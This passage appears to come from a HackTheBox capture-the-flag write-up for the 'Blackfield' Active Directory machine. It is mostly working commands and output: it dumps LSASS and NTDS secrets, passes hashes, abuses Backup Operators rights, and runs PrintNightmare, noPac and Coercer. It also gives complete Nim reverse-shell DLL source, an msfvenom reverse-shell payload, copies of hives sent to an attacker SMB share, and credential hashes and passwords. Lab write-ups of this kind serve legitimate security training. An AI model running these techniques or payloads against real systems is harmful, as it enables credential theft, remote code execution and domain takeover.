getting file \tools\sleuthkit-4.8.0-win32\bin\api-ms-win-core-console-l1-1-0.dll of size 19136 as tools/sleuthkit-4.8.0-win32/bin/api-ms-win-core-console-l1-1-0.dll (47.8 KiloBytes/sec) (average 1377.8 KiloBytes/sec)
[...]
getting file \tools\sleuthkit-4.8.0-win32\lib\libtsk.lib of size 54021518 as tools/sleuthkit-4.8.0-win32/lib/libtsk.lib (2225.3 KiloBytes/sec) (average 825.7 KiloBytes/sec)
getting file \tools\sleuthkit-4.8.0-win32\lib\libtsk_jni.lib of size 26362 as tools/sleuthkit-4.8.0-win32/lib/libtsk_jni.lib (69.4 KiloBytes/sec) (average 825.3 KiloBytes/sec)
getting file \tools\sleuthkit-4.8.0-win32\lib\Rejistry++.lib of size 24940824 as tools/sleuthkit-4.8.0-win32/lib/Rejistry++.lib (1678.2 KiloBytes/sec) (average 840.7 KiloBytes/sec)
[...]
```

### Dump lsass secrets

The moment I saw `lsass.zip`, I knew what to do

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ 7z l loot/smb/forensic/memory_analysis/lsass.zip
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02 ....A    143044222     41935982  lsass.DMP
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02          143044222     41935982  1 files

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ 7z x loot/smb/forensic/memory_analysis/lsass.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ pypykatz lsa minidump lsass.DMP
```

```bash
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
[...]
== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a89550
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
```

### Winrm

Tried to pass the hash for `administrator`, but looks like the password have changed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
```

`svc_backup`'s credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ evil-winrm -i $(pt get rhost) -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat C:\Users\svc_backup\Desktop\user.txt
3920bb317a0bef51027e2852be64b543
```

# Root Flag
---

## From svc_backup to Domain Admin


### Enumeration

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir \\localhost\c$


    Directory: \\localhost\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt

*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat C:\notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

We have `Backup Operators` group and `SeBackupPrivilege` privilege

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Backup operators to domain admin


#### Foothold

For AD joined machine, I can dump `NTDS` or `SAM & LSA secrets`, then extract user hashes

> > Tool - https://github.com/mpgn/BackupOperatorToDA
> 
> In order to use the tool without touching the Domain Controller machine, I will use my **Commando Windows VM** to perform actions remotely
{: .prompt-info }

> A faster and and living off the land method will be written in [Additional](#Additional) section
{: .prompt-tip }

#### Join window VM to domain

Connect to HTB VPN

![](/assets/obsidian/09021f9dc5e51e743107dbba3950ec50.png)

Configure DNS for **openvpn** adapter, so that Domain Controller can be resolved. Without this step, an error will occur : `an active domain controller could not be contacted`

```bash
ncpa.cpl
```

![](/assets/obsidian/62e17cddac0c0e1dce2036939c2beb53.png)

Join this computer to domain

![](/assets/obsidian/fedbfb34a1bba9162454bdf6a0fb5b93.png)

![](/assets/obsidian/47ca79338b7d3384b094d02c50a283e0.png)

![](/assets/obsidian/dc24bb379929494a8a51a3278380e73a.png)

![](/assets/obsidian/72fdd110f245a6b2541fc53f967580fb.png)

![](/assets/obsidian/55d1009655fd76b42ccc7c0958051764.png)

After that, restart the machine

![](/assets/obsidian/3cfb8b5c0a164ad2e0f43bafbb1e7cf4.png)

#### Pass the hash and run BackupOperatorToDA

> Didn't output the dumped hives directly to UNC path because it caused errors
{: .prompt-tip }

```bash
mimikatz.x64.exe
sekurlsa::pth /user:svc_backup /domain:BLACKFIELD.local /ntlm:9658d1d1dcd9250115e2205d9f48400d
```

```bash
BackupOperatorToDA.exe -t \\dc01.blackfield.local -o C:\programdata\
```

![](/assets/obsidian/91035263a89faab4b2ab30aed86d8c10.png)

### Extract registry hives

Back to kali and transfer the files

```bash
mkdir -p smb && cd smb && smbserver.py -smb2support s . -username s -password s
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd \programdata
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.9\s /user:s s
The command completed successfully.
*Evil-WinRM* PS C:\programdata> copy SAM \\10.10.14.9\s
*Evil-WinRM* PS C:\programdata> copy SYSTEM \\10.10.14.9\s
*Evil-WinRM* PS C:\programdata> copy SECURITY \\10.10.14.9\s
```

Extract data from hives, we get `Administrator`'s password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield/smb]
└─$ secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.12.0.dev1+20240130.154745.97007e8 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:90739180d9abfb9a88864d038be564a71083c094372c86c76c15118f5eca06ba1f894980195423a14a478c0fdcd65d063d63b3ca1973e0596a4e238231bd632dc8766bee5485ba18fab8c695bc845c6cce0fdca7f2623003f82737e2b33c3acec4ec432cec643f0fb1d9ddbcac030bec6ad7a801aa8b21634f54bb1178d0b79cedfdd0c1b4b0d9a5fed5a15525fe8931f78d5b411ceac76eb317991fb91ac6e2c281ae86247724b80a099326ccd86bc1bc8082170fde82114ec74bdc89e14f381ac548f55c05e9abbc640e8ea5dc39e13e951b0d1f67141a339437c5bd07520e1700228ad35c9b14ec3840c057a4c2b7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:094d3201e502bcaeacecb6e446efb70e
[*] DefaultPassword
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] NL$KM
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] Cleaning up...
```

### Evil-winrm

The NTLM hash is invalid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [-] BLACKFIELD.local\Administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051' --local-auth
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [-] DC01\Administrator:67ef902eae0d740df6257f273de75051 STATUS_LOGON_FAILURE
```

Credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'Administrator' -p '###_ADM1N_3920_###'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\Administrator:###_ADM1N_3920_### (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ evil-winrm -i $(pt get rhost) -u 'Administrator' -p '###_ADM1N_3920_###'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```

# Additional
---

## Backup operators to domain admin (Dump NTDS)

> refer - https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#grab-ntdsdit

> `vss.dsh`

```bash
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

> `vss_clean.dsh`

```bash
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
delete shadows volume df
reset
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ unix2dos vss.dsh vss_clean.dsh
unix2dos: converting file vss.dsh to DOS format...
unix2dos: converting file vss_clean.dsh to DOS format...
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload vss.dsh

Info: Uploading /home/kali/htb/Blackfield/vss.dsh to C:\programdata\vss.dsh

Data: 176 bytes of 176 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload vss_clean.dsh

Info: Uploading /home/kali/htb/Blackfield/vss_clean.dsh to C:\programdata\vss_clean.dsh

Data: 156 bytes of 156 bytes copied

Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\programdata> diskshadow /s c:\programdata\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/7/2024 3:57:35 PM

-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
-> set verbose on
-> add volume c: alias df
-> create

Alias df for shadow ID {55bc24a6-302e-4c96-a375-14299d2e6bdb} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {ba2663b8-6a3c-4340-9b6e-6c6806b93b21} set as environment variable.
Inserted file Manifest.xml into .cab file df.cab
Inserted file Dis7FF1.tmp into .cab file df.cab

Querying all shadow copies with the shadow copy set ID {ba2663b8-6a3c-4340-9b6e-6c6806b93b21}

        * Shadow copy ID = {55bc24a6-302e-4c96-a375-14299d2e6bdb}               %df%
                - Shadow copy set: {ba2663b8-6a3c-4340-9b6e-6c6806b93b21}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/7/2024 3:57:36 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %df% z:
-> %df% = {55bc24a6-302e-4c96-a375-14299d2e6bdb}
The shadow copy was successfully exposed as z:\.
->
```

Dump NTDS and system hive

```bash
*Evil-WinRM* PS C:\programdata> robocopy /b z:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, February 7, 2024 4:07:22 PM
   Source : z:\Windows\NTDS\
     Dest : C:\programdata\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\Windows\NTDS\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         0         1         0         0         0
   Bytes :   18.00 m         0   18.00 m         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Wednesday, February 7, 2024 4:07:22 PM

*Evil-WinRM* PS C:\programdata> reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.
```

Cleanup shadow copy

```bash
*Evil-WinRM* PS C:\programdata> diskshadow /s c:\programdata\vss_clean.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/7/2024 4:19:12 PM

-> set context persistent nowriters
-> set metadata c:\programdata\df.cab
The existing file will be overwritten.
-> set verbose on
-> delete shadows volume df
Deleting shadow copy {55bc24a6-302e-4c96-a375-14299d2e6bdb} on volume \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]...

Number of shadow copies deleted: 1
-> reset
->
```

Transfer the dumps

```bash
mkdir -p smb && cd smb && smbserver.py -smb2support s . -username s -password s
```

```bash
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.9\s /user:s s
The command completed successfully.

*Evil-WinRM* PS C:\programdata> copy SYSTEM \\10.10.14.9\s
*Evil-WinRM* PS C:\programdata> copy NTDS\ntds.dit \\10.10.14.9\s
```

Extract data

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile secretsdump
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield/smb]
└─$ cat secretsdump* | grep -iE 'krbtgt|administrator'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
krbtgt:aes256-cts-hmac-sha1-96:bd31681b175bd44ddf68c064445ca4e510ba2115e106905bdfef6ef0ff66b32c
krbtgt:aes128-cts-hmac-sha1-96:676f63c263b8d482b271d091b2dde762
krbtgt:des-cbc-md5:fb4cb5761aef465d
```


## NXC automator - Automate netexec modules

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ ~/scripts/ad/nxc_automator.sh low $(pt get rhost) -u 'support' -p '#00^BlackKnight'
[!] Press CTRL + C twice to skip a module!
Choose one or more modules to run [Available Protocols : ldap rdp ssh vnc ftp mssql smb wmi winrm]
Protocols (Ex Format : ldap mssql smb) ~> smb ldap
```

![](/assets/obsidian/69747524d3e53c377499ea7eb5a46a09.png)

![](/assets/obsidian/1377931e5911fe3a6bfa9194c04a5c41.png)

![](/assets/obsidian/a3ad03e240532d78bc709664a45788c3.png)


## PrintNightmare - Bypass anti virus with nim

> https://github.com/ly4k/PrintNightmare

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/PrintNightmare]
└─$ python printnightmare.py -check 'support:#00^BlackKnight@BLACKFIELD.local'
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Target appears to be vulnerable!
```

```bash
mkdir -p smb && cd smb && smbserver.py -smb2support s .
```

The windows machine have Anti Virus which will block the DLL generated by **msfvenom**

```bash
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$(pt get lhost) LPORT=443 -o msf.dll
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/PrintNightmare]
└─$ python printnightmare.py 'support:#00^BlackKnight@BLACKFIELD.local' -dll '\\10.10.14.9\s\msf.dll'
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\10.10.14.9\\s\\msf.dll'
[*] Copying over DLL
[-] Failed to create printer driver: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

Use **nim** to create a reverse shell DLL

> `rev.nim`

```bash
import winim/lean
import net, osproc, strformat

proc NimMain() {.cdecl, importc.}
proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    if fdwReason == DLL_PROCESS_ATTACH:
        let
            ip = "10.10.14.9"
            port = 1111
            sock = newSocket()
            prompt = "> "

        #connection
        while true:
            try:
                sock.connect(ip, Port(port))
            except:
                continue
            break
        #loop remote shell
        while true:
            send(sock,prompt)
            let args = recvLine(sock)
            #execute
            try:
                let cmd = execProcess(fmt"cmd.exe /c" & args)
                send(sock, cmd)
            except:
                break
    return true
```

^b02c5e

 Build DLL
 
```bash
nim c -d=mingw --app=lib --nomain -d:release --cpu=amd64 rev.nim
```

Exploit (Wait about 1 minute)

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/PrintNightmare]
└─$ python printnightmare.py 'support:#00^BlackKnight@BLACKFIELD.local' -dll '\\10.10.14.9\s\rev.dll'
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Enumerating printer drivers
[*] Driver name: 'Microsoft XPS Document Writer v5'
[*] Driver path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL'
[*] DLL path: '\\\\10.10.14.9\\s\\rev.dll'
[*] Copying over DLL
[*] Successfully copied over DLL
[*] Trying to load DLL
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield/smb]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.203.96] 59273
> whoami
nt authority\system
```

## Nopac - Countermeasure for blocked NTP port

I can't sync time with DC since NTP port was blocked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ sudo ntpdate BLACKFIELD.local
ntpdig: no eligible servers

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ sudo nmap -p123 -sU -P0 $(pt get rhost)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 16:33 CST
Nmap scan report for BLACKFIELD.local (10.129.213.195)
Host is up.

PORT    STATE         SERVICE
123/udp open|filtered ntp

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

Get a shell on the server to get date and timezone info

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> date

Wednesday, February 7, 2024 6:29:38 PM


*Evil-WinRM* PS C:\Users\svc_backup\Documents> get-timezone


Id                         : Pacific Standard Time
DisplayName                : (UTC-08:00) Pacific Time (US & Canada)
StandardName               : Pacific Standard Time
DaylightName               : Pacific Daylight Time
BaseUtcOffset              : -08:00:00
SupportsDaylightSavingTime : True
```

My timezone is `UTC+8`, so I need to set my time `16` hours ahead (`8 - -8 = 16`)

```bash
faketime 'Wednesday, February 8, 2024 10:29:38 AM' zsh
```

Now the exploit works!

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ python /opt/sectools/ad/noPac/noPac.py $(pt get rhost)/'support':'#00^BlackKnight' -use-ldap

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target dc01.blackfield.local
[*] Total Domain Admins 1
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-THWALZY82DS$"
[*] MachineAccount "WIN-THWALZY82DS$" password = 31k!kOI7HarB
[*] Successfully added machine account WIN-THWALZY82DS$ with password 31k!kOI7HarB.
[*] WIN-THWALZY82DS$ object = CN=WIN-THWALZY82DS,CN=Computers,DC=BLACKFIELD,DC=local
[*] WIN-THWALZY82DS$ sAMAccountName == dc01
[*] Saving a DC's ticket in dc01.ccache
[*] Reseting the machine account to WIN-THWALZY82DS$
[*] Restored WIN-THWALZY82DS$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*] Saving a user's ticket in Administrator.ccache
[*] Rename ccache to Administrator_dc01.blackfield.local.ccache
[*] Attempting to del a computer with the name: WIN-THWALZY82DS$
[-] Delete computer WIN-THWALZY82DS$ Failed! Maybe the current user does not have permission.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ export KRB5CCNAME=Administrator_dc01.blackfield.local.ccache

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) --use-kcache -x whoami
SMB         10.129.9.155    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.9.155    445    DC01             [+] BLACKFIELD.local\Administrator from ccache (Pwn3d!)
SMB         10.129.9.155    445    DC01             [+] Executed command via wmiexec
SMB         10.129.9.155    445    DC01             blackfield\administrator
```

## Coercer

> https://github.com/p0dalirius/Coercer

> sometimes **coercer** will take longer to run, switch to **petipotam** or **DFSCoerce** if needed
{: .prompt-tip }

```bash
sudo responder -A -I tun0 -v
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ coercer coerce -l $(pt get lhost) -t DC01.BLACKFIELD.local -u 'support' -p '#00^BlackKnight' -v
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target DC01.BLACKFIELD.local
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49667,49668,49698,49675,49676,56171,49689
[+] Coercing 'DC01.BLACKFIELD.local' to authenticate to '10.10.14.9'
[!] DCERPC port '49676' is closed!
[!] SMB named pipe '\PIPE\Fssagentrpc' is not accessible!
[!] SMB named pipe '\PIPE\efsrpc' is not accessible!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.14.9\o5sTzkXC\aa')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? C
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\10.10.14.9\WbQY6tM3\file.txt\x00')
```

Default machine account password have `120+ characters` so it's unlikely crackable, and there's no other targets for me to relay to

```bash
[SMB] NTLMv2-SSP Client   : 10.129.9.155
[SMB] NTLMv2-SSP Username : BLACKFIELD\DC01$
